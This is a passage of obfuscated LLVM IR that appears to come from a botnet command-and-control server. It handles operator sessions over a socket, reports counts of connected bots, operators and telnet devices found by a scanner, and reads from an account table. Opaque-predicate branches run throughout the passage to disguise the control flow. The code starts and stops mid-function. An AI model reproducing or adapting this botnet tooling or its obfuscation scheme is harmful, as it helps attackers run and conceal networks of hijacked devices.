  %372 = call i32 (i8*, i8*, ...) @sprintf(i8* %371, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.36, i32 0, i32 0)) #7
  %373 = load i32, i32* %12, align 4
  %374 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %375 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %376 = call i64 @strlen(i8* %375) #8
  %377 = call i64 @send(i32 %373, i8* %374, i64 %376, i32 16384)
  %378 = icmp eq i64 %377, -1
  %379 = load i32, i32* @x.15
  %380 = load i32, i32* @y.16
  %381 = sub i32 %379, 1
  %382 = mul i32 %379, %381
  %383 = urem i32 %382, 2
  %384 = icmp eq i32 %383, 0
  %385 = icmp slt i32 %380, 10
  %386 = or i1 %384, %385
  br i1 %386, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br i1 %378, label %387, label %404

; <label>:387:                                    ; preds = %originalBBpart243
  %388 = load i32, i32* @x.15
  %389 = load i32, i32* @y.16
  %390 = sub i32 %388, 1
  %391 = mul i32 %388, %390
  %392 = urem i32 %391, 2
  %393 = icmp eq i32 %392, 0
  %394 = icmp slt i32 %389, 10
  %395 = or i1 %393, %394
  br i1 %395, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %387
  %396 = load i32, i32* @x.15
  %397 = load i32, i32* @y.16
  %398 = sub i32 %396, 1
  %399 = mul i32 %396, %398
  %400 = urem i32 %399, 2
  %401 = icmp eq i32 %400, 0
  %402 = icmp slt i32 %397, 10
  %403 = or i1 %401, %402
  br i1 %403, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br label %1831

; <label>:404:                                    ; preds = %originalBBpart243
  %405 = load i32, i32* %12, align 4
  %406 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i32 0, i32 0
  %407 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i32 0, i32 0
  %408 = call i64 @strlen(i8* %407) #8
  %409 = call i64 @send(i32 %405, i8* %406, i64 %408, i32 16384)
  %410 = icmp eq i64 %409, -1
  br i1 %410, label %411, label %428

; <label>:411:                                    ; preds = %404
  %412 = load i32, i32* @x.15
  %413 = load i32, i32* @y.16
  %414 = sub i32 %412, 1
  %415 = mul i32 %412, %414
  %416 = urem i32 %415, 2
  %417 = icmp eq i32 %416, 0
  %418 = icmp slt i32 %413, 10
  %419 = or i1 %417, %418
  br i1 %419, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %411
  %420 = load i32, i32* @x.15
  %421 = load i32, i32* @y.16
  %422 = sub i32 %420, 1
  %423 = mul i32 %420, %422
  %424 = urem i32 %423, 2
  %425 = icmp eq i32 %424, 0
  %426 = icmp slt i32 %421, 10
  %427 = or i1 %425, %426
  br i1 %427, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br label %1831

; <label>:428:                                    ; preds = %404
  %429 = load i32, i32* @x.15
  %430 = load i32, i32* @y.16
  %431 = sub i32 %429, 1
  %432 = mul i32 %429, %431
  %433 = urem i32 %432, 2
  %434 = icmp eq i32 %433, 0
  %435 = icmp slt i32 %430, 10
  %436 = or i1 %434, %435
  br i1 %436, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %428
  %437 = load i32, i32* %12, align 4
  %438 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i32 0, i32 0
  %439 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i32 0, i32 0
  %440 = call i64 @strlen(i8* %439) #8
  %441 = call i64 @send(i32 %437, i8* %438, i64 %440, i32 16384)
  %442 = icmp eq i64 %441, -1
  %443 = load i32, i32* @x.15
  %444 = load i32, i32* @y.16
  %445 = sub i32 %443, 1
  %446 = mul i32 %443, %445
  %447 = urem i32 %446, 2
  %448 = icmp eq i32 %447, 0
  %449 = icmp slt i32 %444, 10
  %450 = or i1 %448, %449
  br i1 %450, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br i1 %442, label %451, label %452

; <label>:451:                                    ; preds = %originalBBpart255
  br label %1831

; <label>:452:                                    ; preds = %originalBBpart255
  %453 = load i32, i32* @x.15
  %454 = load i32, i32* @y.16
  %455 = sub i32 %453, 1
  %456 = mul i32 %453, %455
  %457 = urem i32 %456, 2
  %458 = icmp eq i32 %457, 0
  %459 = icmp slt i32 %454, 10
  %460 = or i1 %458, %459
  br i1 %460, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %452
  %461 = load i32, i32* %12, align 4
  %462 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i32 0, i32 0
  %463 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i32 0, i32 0
  %464 = call i64 @strlen(i8* %463) #8
  %465 = call i64 @send(i32 %461, i8* %462, i64 %464, i32 16384)
  %466 = icmp eq i64 %465, -1
  %467 = load i32, i32* @x.15
  %468 = load i32, i32* @y.16
  %469 = sub i32 %467, 1
  %470 = mul i32 %467, %469
  %471 = urem i32 %470, 2
  %472 = icmp eq i32 %471, 0
  %473 = icmp slt i32 %468, 10
  %474 = or i1 %472, %473
  br i1 %474, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br i1 %466, label %475, label %476

; <label>:475:                                    ; preds = %originalBBpart259
  br label %1831

; <label>:476:                                    ; preds = %originalBBpart259
  %477 = load i32, i32* %12, align 4
  %478 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i32 0, i32 0
  %479 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i32 0, i32 0
  %480 = call i64 @strlen(i8* %479) #8
  %481 = call i64 @send(i32 %477, i8* %478, i64 %480, i32 16384)
  %482 = icmp eq i64 %481, -1
  br i1 %482, label %483, label %500

; <label>:483:                                    ; preds = %476
  %484 = load i32, i32* @x.15
  %485 = load i32, i32* @y.16
  %486 = sub i32 %484, 1
  %487 = mul i32 %484, %486
  %488 = urem i32 %487, 2
  %489 = icmp eq i32 %488, 0
  %490 = icmp slt i32 %485, 10
  %491 = or i1 %489, %490
  br i1 %491, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %483
  %492 = load i32, i32* @x.15
  %493 = load i32, i32* @y.16
  %494 = sub i32 %492, 1
  %495 = mul i32 %492, %494
  %496 = urem i32 %495, 2
  %497 = icmp eq i32 %496, 0
  %498 = icmp slt i32 %493, 10
  %499 = or i1 %497, %498
  br i1 %499, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br label %1831

; <label>:500:                                    ; preds = %476
  %501 = load i32, i32* @x.15
  %502 = load i32, i32* @y.16
  %503 = sub i32 %501, 1
  %504 = mul i32 %501, %503
  %505 = urem i32 %504, 2
  %506 = icmp eq i32 %505, 0
  %507 = icmp slt i32 %502, 10
  %508 = or i1 %506, %507
  br i1 %508, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %500
  %509 = load i32, i32* %12, align 4
  %510 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i32 0, i32 0
  %511 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i32 0, i32 0
  %512 = call i64 @strlen(i8* %511) #8
  %513 = call i64 @send(i32 %509, i8* %510, i64 %512, i32 16384)
  %514 = icmp eq i64 %513, -1
  %515 = load i32, i32* @x.15
  %516 = load i32, i32* @y.16
  %517 = sub i32 %515, 1
  %518 = mul i32 %515, %517
  %519 = urem i32 %518, 2
  %520 = icmp eq i32 %519, 0
  %521 = icmp slt i32 %516, 10
  %522 = or i1 %520, %521
  br i1 %522, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br i1 %514, label %523, label %524

; <label>:523:                                    ; preds = %originalBBpart267
  br label %1831

; <label>:524:                                    ; preds = %originalBBpart267
  %525 = load i32, i32* %12, align 4
  %526 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i32 0, i32 0
  %527 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i32 0, i32 0
  %528 = call i64 @strlen(i8* %527) #8
  %529 = call i64 @send(i32 %525, i8* %526, i64 %528, i32 16384)
  %530 = icmp eq i64 %529, -1
  br i1 %530, label %531, label %532

; <label>:531:                                    ; preds = %524
  br label %1831

; <label>:532:                                    ; preds = %524
  %533 = load i32, i32* @x.15
  %534 = load i32, i32* @y.16
  %535 = sub i32 %533, 1
  %536 = mul i32 %533, %535
  %537 = urem i32 %536, 2
  %538 = icmp eq i32 %537, 0
  %539 = icmp slt i32 %534, 10
  %540 = or i1 %538, %539
  br i1 %540, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %532
  %541 = load i32, i32* %12, align 4
  %542 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i32 0, i32 0
  %543 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i32 0, i32 0
  %544 = call i64 @strlen(i8* %543) #8
  %545 = call i64 @send(i32 %541, i8* %542, i64 %544, i32 16384)
  %546 = icmp eq i64 %545, -1
  %547 = load i32, i32* @x.15
  %548 = load i32, i32* @y.16
  %549 = sub i32 %547, 1
  %550 = mul i32 %547, %549
  %551 = urem i32 %550, 2
  %552 = icmp eq i32 %551, 0
  %553 = icmp slt i32 %548, 10
  %554 = or i1 %552, %553
  br i1 %554, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br i1 %546, label %555, label %556

; <label>:555:                                    ; preds = %originalBBpart271
  br label %1831

; <label>:556:                                    ; preds = %originalBBpart271
  %557 = load i32, i32* %12, align 4
  %558 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i32 0, i32 0
  %559 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i32 0, i32 0
  %560 = call i64 @strlen(i8* %559) #8
  %561 = call i64 @send(i32 %557, i8* %558, i64 %560, i32 16384)
  %562 = icmp eq i64 %561, -1
  br i1 %562, label %563, label %564

; <label>:563:                                    ; preds = %556
  br label %1831

; <label>:564:                                    ; preds = %556
  %565 = load i32, i32* %12, align 4
  %566 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i32 0, i32 0
  %567 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i32 0, i32 0
  %568 = call i64 @strlen(i8* %567) #8
  %569 = call i64 @send(i32 %565, i8* %566, i64 %568, i32 16384)
  %570 = icmp eq i64 %569, -1
  br i1 %570, label %571, label %572

; <label>:571:                                    ; preds = %564
  br label %1831

; <label>:572:                                    ; preds = %564
  %573 = load i32, i32* @x.15
  %574 = load i32, i32* @y.16
  %575 = sub i32 %573, 1
  %576 = mul i32 %573, %575
  %577 = urem i32 %576, 2
  %578 = icmp eq i32 %577, 0
  %579 = icmp slt i32 %574, 10
  %580 = or i1 %578, %579
  br i1 %580, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %572
  %581 = load i32, i32* @x.15
  %582 = load i32, i32* @y.16
  %583 = sub i32 %581, 1
  %584 = mul i32 %581, %583
  %585 = urem i32 %584, 2
  %586 = icmp eq i32 %585, 0
  %587 = icmp slt i32 %582, 10
  %588 = or i1 %586, %587
  br i1 %588, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br label %589

; <label>:589:                                    ; preds = %originalBBpart275
  %590 = load i32, i32* %12, align 4
  %591 = getelementptr inbounds [2048 x i8], [2048 x i8]* %35, i32 0, i32 0
  %592 = getelementptr inbounds [2048 x i8], [2048 x i8]* %35, i32 0, i32 0
  %593 = call i64 @strlen(i8* %592) #8
  %594 = call i64 @send(i32 %590, i8* %591, i64 %593, i32 16384)
  %595 = icmp eq i64 %594, -1
  br i1 %595, label %596, label %597

; <label>:596:                                    ; preds = %589
  br label %1831

; <label>:597:                                    ; preds = %589
  %598 = load i32, i32* @x.15
  %599 = load i32, i32* @y.16
  %600 = sub i32 %598, 1
  %601 = mul i32 %598, %600
  %602 = urem i32 %601, 2
  %603 = icmp eq i32 %602, 0
  %604 = icmp slt i32 %599, 10
  %605 = or i1 %603, %604
  br i1 %605, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %597
  %606 = load i32, i32* %12, align 4
  %607 = call i64 @send(i32 %606, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %608 = icmp eq i64 %607, -1
  %609 = load i32, i32* @x.15
  %610 = load i32, i32* @y.16
  %611 = sub i32 %609, 1
  %612 = mul i32 %609, %611
  %613 = urem i32 %612, 2
  %614 = icmp eq i32 %613, 0
  %615 = icmp slt i32 %610, 10
  %616 = or i1 %614, %615
  br i1 %616, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  br i1 %608, label %617, label %618

; <label>:617:                                    ; preds = %originalBBpart279
  br label %1831

; <label>:618:                                    ; preds = %originalBBpart279
  %619 = load i32, i32* @x.15
  %620 = load i32, i32* @y.16
  %621 = sub i32 %619, 1
  %622 = mul i32 %619, %621
  %623 = urem i32 %622, 2
  %624 = icmp eq i32 %623, 0
  %625 = icmp slt i32 %620, 10
  %626 = or i1 %624, %625
  br i1 %626, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %618
  %627 = load i32, i32* @x.15
  %628 = load i32, i32* @y.16
  %629 = sub i32 %627, 1
  %630 = mul i32 %627, %629
  %631 = urem i32 %630, 2
  %632 = icmp eq i32 %631, 0
  %633 = icmp slt i32 %628, 10
  %634 = or i1 %632, %633
  br i1 %634, label %originalBBpart283, label %originalBB81alteredBB

originalBBpart283:                                ; preds = %originalBB81
  br label %635

; <label>:635:                                    ; preds = %originalBBpart283
  %636 = load i8*, i8** %11, align 8
  %637 = call i32 @pthread_create(i64* %14, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %636) #7
  %638 = load i32, i32* %12, align 4
  %639 = sext i32 %638 to i64
  %640 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %639
  %641 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %640, i32 0, i32 0
  store i32 1, i32* %641, align 4
  br label %642

; <label>:642:                                    ; preds = %originalBBpart2243, %1780, %originalBBpart2235, %originalBBpart2227, %1587, %1396, %1327, %1183, %740, %originalBBpart287, %635
  %643 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %644 = load i32, i32* %12, align 4
  %645 = call i32 @fdgets(i8* %643, i32 2048, i32 %644)
  %646 = icmp sgt i32 %645, 0
  br i1 %646, label %647, label %1830

; <label>:647:                                    ; preds = %642
  %648 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %649 = call i8* @strstr(i8* %648, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.38, i32 0, i32 0)) #8
  %650 = icmp ne i8* %649, null
  br i1 %650, label %651, label %686

; <label>:651:                                    ; preds = %647
  %652 = getelementptr inbounds [2048 x i8], [2048 x i8]* %36, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %652, i8 0, i64 2048, i32 16, i1 false)
  %653 = getelementptr inbounds [2048 x i8], [2048 x i8]* %36, i32 0, i32 0
  %654 = call i32 @BotsConnected()
  %655 = load volatile i32, i32* @OperatorsConnected, align 4
  %656 = call i32 (i8*, i8*, ...) @sprintf(i8* %653, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.39, i32 0, i32 0), i32 %654, i32 %655) #7
  %657 = load i32, i32* %12, align 4
  %658 = getelementptr inbounds [2048 x i8], [2048 x i8]* %36, i32 0, i32 0
  %659 = getelementptr inbounds [2048 x i8], [2048 x i8]* %36, i32 0, i32 0
  %660 = call i64 @strlen(i8* %659) #8
  %661 = call i64 @send(i32 %657, i8* %658, i64 %660, i32 16384)
  %662 = icmp eq i64 %661, -1
  br i1 %662, label %663, label %664

; <label>:663:                                    ; preds = %651
  store i8* null, i8** %10, align 8
  br label %1840

; <label>:664:                                    ; preds = %651
  %665 = load i32, i32* %12, align 4
  %666 = call i64 @send(i32 %665, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %667 = icmp eq i64 %666, -1
  br i1 %667, label %668, label %669

; <label>:668:                                    ; preds = %664
  br label %1831

; <label>:669:                                    ; preds = %664
  %670 = load i32, i32* @x.15
  %671 = load i32, i32* @y.16
  %672 = sub i32 %670, 1
  %673 = mul i32 %670, %672
  %674 = urem i32 %673, 2
  %675 = icmp eq i32 %674, 0
  %676 = icmp slt i32 %671, 10
  %677 = or i1 %675, %676
  br i1 %677, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %669
  %678 = load i32, i32* @x.15
  %679 = load i32, i32* @y.16
  %680 = sub i32 %678, 1
  %681 = mul i32 %678, %680
  %682 = urem i32 %681, 2
  %683 = icmp eq i32 %682, 0
  %684 = icmp slt i32 %679, 10
  %685 = or i1 %683, %684
  br i1 %685, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br label %642

; <label>:686:                                    ; preds = %647
  %687 = load i32, i32* @x.15
  %688 = load i32, i32* @y.16
  %689 = sub i32 %687, 1
  %690 = mul i32 %687, %689
  %691 = urem i32 %690, 2
  %692 = icmp eq i32 %691, 0
  %693 = icmp slt i32 %688, 10
  %694 = or i1 %692, %693
  br i1 %694, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %686
  %695 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %696 = call i8* @strstr(i8* %695, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i32 0, i32 0)) #8
  %697 = icmp ne i8* %696, null
  %698 = load i32, i32* @x.15
  %699 = load i32, i32* @y.16
  %700 = sub i32 %698, 1
  %701 = mul i32 %698, %700
  %702 = urem i32 %701, 2
  %703 = icmp eq i32 %702, 0
  %704 = icmp slt i32 %699, 10
  %705 = or i1 %703, %704
  br i1 %705, label %originalBBpart291, label %originalBB89alteredBB

originalBBpart291:                                ; preds = %originalBB89
  br i1 %697, label %706, label %741

; <label>:706:                                    ; preds = %originalBBpart291
  %707 = getelementptr inbounds [2048 x i8], [2048 x i8]* %37, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %707, i8 0, i64 2048, i32 16, i1 false)
  %708 = getelementptr inbounds [2048 x i8], [2048 x i8]* %37, i32 0, i32 0
  %709 = load volatile i32, i32* @TELFound, align 4
  %710 = load volatile i32, i32* @scannerreport, align 4
  %711 = call i32 (i8*, i8*, ...) @sprintf(i8* %708, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.41, i32 0, i32 0), i32 %709, i32 %710) #7
  %712 = load i32, i32* %12, align 4
  %713 = getelementptr inbounds [2048 x i8], [2048 x i8]* %37, i32 0, i32 0
  %714 = getelementptr inbounds [2048 x i8], [2048 x i8]* %37, i32 0, i32 0
  %715 = call i64 @strlen(i8* %714) #8
  %716 = call i64 @send(i32 %712, i8* %713, i64 %715, i32 16384)
  %717 = icmp eq i64 %716, -1
  br i1 %717, label %718, label %719

; <label>:718:                                    ; preds = %706
  store i8* null, i8** %10, align 8
  br label %1840

; <label>:719:                                    ; preds = %706
  %720 = load i32, i32* @x.15
  %721 = load i32, i32* @y.16
  %722 = sub i32 %720, 1
  %723 = mul i32 %720, %722
  %724 = urem i32 %723, 2
  %725 = icmp eq i32 %724, 0
  %726 = icmp slt i32 %721, 10
  %727 = or i1 %725, %726
  br i1 %727, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %719
  %728 = load i32, i32* %12, align 4
  %729 = call i64 @send(i32 %728, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %730 = icmp eq i64 %729, -1
  %731 = load i32, i32* @x.15
  %732 = load i32, i32* @y.16
  %733 = sub i32 %731, 1
  %734 = mul i32 %731, %733
  %735 = urem i32 %734, 2
  %736 = icmp eq i32 %735, 0
  %737 = icmp slt i32 %732, 10
  %738 = or i1 %736, %737
  br i1 %738, label %originalBBpart295, label %originalBB93alteredBB

originalBBpart295:                                ; preds = %originalBB93
  br i1 %730, label %739, label %740

; <label>:739:                                    ; preds = %originalBBpart295
  br label %1831

; <label>:740:                                    ; preds = %originalBBpart295
  br label %642

; <label>:741:                                    ; preds = %originalBBpart291
  %742 = load i32, i32* @x.15
  %743 = load i32, i32* @y.16
  %744 = sub i32 %742, 1
  %745 = mul i32 %742, %744
  %746 = urem i32 %745, 2
  %747 = icmp eq i32 %746, 0
  %748 = icmp slt i32 %743, 10
  %749 = or i1 %747, %748
  br i1 %749, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %741
  %750 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %751 = call i8* @strstr(i8* %750, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.42, i32 0, i32 0)) #8
  %752 = icmp ne i8* %751, null
  %753 = load i32, i32* @x.15
  %754 = load i32, i32* @y.16
  %755 = sub i32 %753, 1
  %756 = mul i32 %753, %755
  %757 = urem i32 %756, 2
  %758 = icmp eq i32 %757, 0
  %759 = icmp slt i32 %754, 10
  %760 = or i1 %758, %759
  br i1 %760, label %originalBBpart299, label %originalBB97alteredBB

originalBBpart299:                                ; preds = %originalBB97
  br i1 %752, label %761, label %1184

; <label>:761:                                    ; preds = %originalBBpart299
  %762 = load i32, i32* @x.15
  %763 = load i32, i32* @y.16
  %764 = sub i32 %762, 1
  %765 = mul i32 %762, %764
  %766 = urem i32 %765, 2
  %767 = icmp eq i32 %766, 0
  %768 = icmp slt i32 %763, 10
  %769 = or i1 %767, %768
  br i1 %769, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %761
  %770 = load i8*, i8** %11, align 8
  %771 = call i32 @pthread_create(i64* %14, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %770) #7
  %772 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i32 0, i32 0
  %773 = load i32, i32* %13, align 4
  %774 = sext i32 %773 to i64
  %775 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %774
  %776 = getelementptr inbounds %struct.login_info, %struct.login_info* %775, i32 0, i32 0
  %777 = getelementptr inbounds [20 x i8], [20 x i8]* %776, i32 0, i32 0
  %778 = call i32 (i8*, i8*, ...) @sprintf(i8* %772, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.43, i32 0, i32 0), i8* %777) #7
  %779 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i32 0, i32 0
  %780 = call i32 (i8*, i8*, ...) @sprintf(i8* %779, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.44, i32 0, i32 0)) #7
  %781 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i32 0, i32 0
  %782 = call i32 (i8*, i8*, ...) @sprintf(i8* %781, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.45, i32 0, i32 0)) #7
  %783 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i32 0, i32 0
  %784 = call i32 (i8*, i8*, ...) @sprintf(i8* %783, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.46, i32 0, i32 0)) #7
  %785 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i32 0, i32 0
  %786 = call i32 (i8*, i8*, ...) @sprintf(i8* %785, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.47, i32 0, i32 0)) #7
  %787 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i32 0, i32 0
  %788 = call i32 (i8*, i8*, ...) @sprintf(i8* %787, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.48, i32 0, i32 0)) #7
  %789 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i32 0, i32 0
  %790 = call i32 (i8*, i8*, ...) @sprintf(i8* %789, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.49, i32 0, i32 0)) #7
  %791 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i32 0, i32 0
  %792 = call i32 (i8*, i8*, ...) @sprintf(i8* %791, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.48, i32 0, i32 0)) #7
  %793 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i32 0, i32 0
  %794 = call i32 (i8*, i8*, ...) @sprintf(i8* %793, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.50, i32 0, i32 0)) #7
  %795 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i32 0, i32 0
  %796 = call i32 (i8*, i8*, ...) @sprintf(i8* %795, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.51, i32 0, i32 0)) #7
  %797 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i32 0, i32 0
  %798 = call i32 (i8*, i8*, ...) @sprintf(i8* %797, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.52, i32 0, i32 0)) #7
  %799 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i32 0, i32 0
  %800 = call i32 (i8*, i8*, ...) @sprintf(i8* %799, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.53, i32 0, i32 0)) #7
  %801 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i32 0, i32 0
  %802 = call i32 (i8*, i8*, ...) @sprintf(i8* %801, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.54, i32 0, i32 0)) #7
  %803 = getelementptr inbounds [80 x i8], [80 x i8]* %52, i32 0, i32 0
  %804 = call i32 (i8*, i8*, ...) @sprintf(i8* %803, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.55, i32 0, i32 0)) #7
  %805 = getelementptr inbounds [80 x i8], [80 x i8]* %53, i32 0, i32 0
  %806 = call i32 (i8*, i8*, ...) @sprintf(i8* %805, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.56, i32 0, i32 0)) #7
  %807 = getelementptr inbounds [80 x i8], [80 x i8]* %54, i32 0, i32 0
  %808 = call i32 (i8*, i8*, ...) @sprintf(i8* %807, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.48, i32 0, i32 0)) #7
  %809 = load i32, i32* %12, align 4
  %810 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i32 0, i32 0
  %811 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i32 0, i32 0
  %812 = call i64 @strlen(i8* %811) #8
  %813 = call i64 @send(i32 %809, i8* %810, i64 %812, i32 16384)
  %814 = icmp eq i64 %813, -1
  %815 = load i32, i32* @x.15
  %816 = load i32, i32* @y.16
  %817 = sub i32 %815, 1
  %818 = mul i32 %815, %817
  %819 = urem i32 %818, 2
  %820 = icmp eq i32 %819, 0
  %821 = icmp slt i32 %816, 10
  %822 = or i1 %820, %821
  br i1 %822, label %originalBBpart2103, label %originalBB101alteredBB

originalBBpart2103:                               ; preds = %originalBB101
  br i1 %814, label %823, label %824

; <label>:823:                                    ; preds = %originalBBpart2103
  br label %1831

; <label>:824:                                    ; preds = %originalBBpart2103
  %825 = load i32, i32* @x.15
  %826 = load i32, i32* @y.16
  %827 = sub i32 %825, 1
  %828 = mul i32 %825, %827
  %829 = urem i32 %828, 2
  %830 = icmp eq i32 %829, 0
  %831 = icmp slt i32 %826, 10
  %832 = or i1 %830, %831
  br i1 %832, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %824
  %833 = load i32, i32* %12, align 4
  %834 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i32 0, i32 0
  %835 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i32 0, i32 0
  %836 = call i64 @strlen(i8* %835) #8
  %837 = call i64 @send(i32 %833, i8* %834, i64 %836, i32 16384)
  %838 = icmp eq i64 %837, -1
  %839 = load i32, i32* @x.15
  %840 = load i32, i32* @y.16
  %841 = sub i32 %839, 1
  %842 = mul i32 %839, %841
  %843 = urem i32 %842, 2
  %844 = icmp eq i32 %843, 0
  %845 = icmp slt i32 %840, 10
  %846 = or i1 %844, %845
  br i1 %846, label %originalBBpart2107, label %originalBB105alteredBB

originalBBpart2107:                               ; preds = %originalBB105
  br i1 %838, label %847, label %864

; <label>:847:                                    ; preds = %originalBBpart2107
  %848 = load i32, i32* @x.15
  %849 = load i32, i32* @y.16
  %850 = sub i32 %848, 1
  %851 = mul i32 %848, %850
  %852 = urem i32 %851, 2
  %853 = icmp eq i32 %852, 0
  %854 = icmp slt i32 %849, 10
  %855 = or i1 %853, %854
  br i1 %855, label %originalBB109, label %originalBB109alteredBB

originalBB109:                                    ; preds = %originalBB109alteredBB, %847
  %856 = load i32, i32* @x.15
  %857 = load i32, i32* @y.16
  %858 = sub i32 %856, 1
  %859 = mul i32 %856, %858
  %860 = urem i32 %859, 2
  %861 = icmp eq i32 %860, 0
  %862 = icmp slt i32 %857, 10
  %863 = or i1 %861, %862
  br i1 %863, label %originalBBpart2111, label %originalBB109alteredBB

originalBBpart2111:                               ; preds = %originalBB109
  br label %1831

; <label>:864:                                    ; preds = %originalBBpart2107
  %865 = load i32, i32* %12, align 4
